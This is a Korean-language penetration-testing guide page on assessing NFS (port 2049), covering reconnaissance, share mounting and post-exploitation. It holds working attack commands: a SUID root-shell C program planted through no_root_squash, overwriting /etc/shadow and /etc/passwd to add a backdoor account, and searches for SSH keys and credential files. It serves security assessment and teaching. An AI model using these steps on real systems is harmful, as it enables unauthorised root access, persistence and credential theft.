---
sidebar_position: 8
title: NFS (Port 2049)
---

# NFS (Port 2049) 취약점 진단

## Overview

**NFS (Network File System)**: 네트워크를 통한 파일 및 디렉토리 공유 프로토콜

**주요 포트**:
- **111/TCP, UDP**: RPC Portmapper (NFS 서비스 위치 정보)
- **2049/TCP, UDP**: NFS 서버 (실제 데이터 전송)

**주요 환경**: Linux/Unix 서버

---

## Assessment Checklist

- [ ] **Export 접근 제어**: 공유된 디렉토리 목록 확인 및 불특정 다수 IP(`*`) 접근 허용 여부 점검
- [ ] **파일 권한**: 마운트 후 중요 파일 읽기(민감 정보 유출) 및 쓰기(악성 스크립트 업로드) 권한 확인
- [ ] **No_Root_Squash 설정 유무**: 클라이언트의 root 권한을 서버에서도 그대로 유지하는 취약한 설정 여부 점검
- [ ] **NFS 버전 점검**: 인증이 없는 NFSv3 사용 여부 (NFSv4는 Kerberos 인증 지원)

---

## 1. Reconnaissance

### 서비스 및 RPC 정보 수집
```bash
# 기본 Nmap 포트 스캔 및 버전 확인
nmap -p 111,2049 -sV <target>

# NFS 관련 전체 NSE 스크립트 실행
nmap -p 111,2049 --script "nfs-*" <target>

# RPC 서비스 매핑 정보 수집 (Portmapper)
rpcinfo -p <target>
```

### Export 목록(공유 폴더) 탐색
```bash
# 서버에서 외부로 공유 중인(Export) 디렉토리 목록 확인
showmount -e <target>

# NetExec을 이용한 공유 열거 및 탐색
netexec nfs <target> --shares
netexec nfs <target> --enum-shares
netexec nfs <target> --share '/var/nfs/general' --ls '/'
```

---

## 2. Exploitation

### NFS 마운트 (Mounting)
```bash
# 1. 로컬에 마운트 포인트 생성
sudo mkdir -p /mnt/nfs-share

# 2. NFS 디렉토리 마운트
sudo mount -t nfs -o vers=4,nolock <target>:<export_folder> /mnt/nfs-share
# 예시: sudo mount -t nfs -o vers=3,nolock 192.168.1.10:/home /mnt/nfs-share

# 3. 마운트된 디렉토리 진입 및 확인
cd /mnt/nfs-share
ls -la
```

### 마운트 디렉토리 내부 파일 처리
```bash
# 파일 읽기 및 쓰기 권한 테스트
cat config.txt
touch test.txt

# [NetExec 대안] 마운트 없이 파일 조작
netexec nfs <target> --get-file /remote/path/file.txt local_file.txt
netexec nfs <target> --put-file local_file.txt /remote/path/file.txt
```

### 권한 상승 (No_Root_Squash 악용)
`/etc/exports` 설정에서 `no_root_squash`가 활성화되어 있으면, 공격자가 로컬(Attacker)에서 root 권한으로 파일을 만들면 대상 서버에서도 root 소유로 인정됨

```bash
# 1. 공격자 환경에서 SUID 쉘(C코드) 작성 및 컴파일
cat > shell.c << EOF
#include <stdio.h>
#include <unistd.h>
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF
gcc shell.c -o shell

# 2. 컴파일된 바이너리를 마운트된 NFS 디렉토리에 복사
sudo cp shell /mnt/nfs-share/

# 3. 공격자(로컬) root 권한으로 SUID 비트 설정
sudo chown root:root /mnt/nfs-share/shell
sudo chmod +s /mnt/nfs-share/shell

# 4. 대상 호스트(Target)에서 일반 유저 권한으로 해당 파일 실행
cd /nfs-mount-point/
./shell

# 5. Root 쉘 획득!
whoami # root
```

### 마운트 해제 (Unmount)
```bash
# 작업 완료 후 마운트 해제
cd ~
sudo umount /mnt/nfs-share
```

---

## 3. Advanced Techniques

### Root 파일 시스템 탈출 (Escape)
전체 루트 디렉토리(`/`)가 Export 되어 쓰기 권한이 있을 경우, 시스템 섀도우 파일을 변조하여 백도어 계정 추가 가능

```bash
# /etc/shadow 및 /etc/passwd 다운로드
netexec nfs <target> --get-file '/etc/shadow' etc_shadow
netexec nfs <target> --get-file '/etc/passwd' etc_passwd

# 악성 계정 정보(backdoor) 로컬 파일에 주입
echo 'backdoor:$6$QF0YMBn9$Gj7DTxYtq7ie...:18000:0:99999:7:::' >> etc_shadow
echo 'backdoor:x:1003:1001:,,,:/home/backdoor:/bin/bash' >> etc_passwd

# 변조된 파일 원격지 덮어쓰기
netexec nfs <target> --put-file etc_shadow '/etc/shadow'
netexec nfs <target> --put-file etc_passwd '/etc/passwd'

# 추가한 백도어 계정으로 SSH 로그인
ssh backdoor@<target>
```

---

## 4. Post-Exploitation

### 민감 정보 수집 (Sensitive Data Gathering)
마운트된 NFS 공유 폴더 내에서 시스템 침투에 활용 가능한 주요 파일 탐색

```bash
# SSH 키 파일 및 숨김 폴더 검색
find /mnt/nfs-share -name "id_rsa*" 2>/dev/null
find /mnt/nfs-share -name ".ssh" 2>/dev/null

# 설정 및 백업 파일 검색
find /mnt/nfs-share -name "*.conf" 2>/dev/null
find /mnt/nfs-share -name "*.bak" 2>/dev/null

# 크리덴셜 정보 파일 읽기
cat /mnt/nfs-share/etc/shadow 2>/dev/null
cat /mnt/nfs-share/home/*/.bash_history 2>/dev/null
```

### NFS 설정 파일 분석
**주요 구성 파일:** `/etc/exports`
```bash
# 파일 분석 예시
/home          192.168.1.0/24(rw,sync,no_subtree_check)
/var/nfs/share *(rw,sync,no_root_squash)
/backup        192.168.1.50(ro,sync,root_squash)
```

**주요 옵션 의미:**
- `rw` / `ro`: 읽기 및 쓰기 허용 / 읽기 전용
- `no_root_squash`: Root 권한 유지 (권한 상승의 주요 원인)
- `root_squash`: Root를 nobody 계정으로 맵핑 (안전한 기본 설정)
- `*`: 전체 IP 접근 허용 (위험)
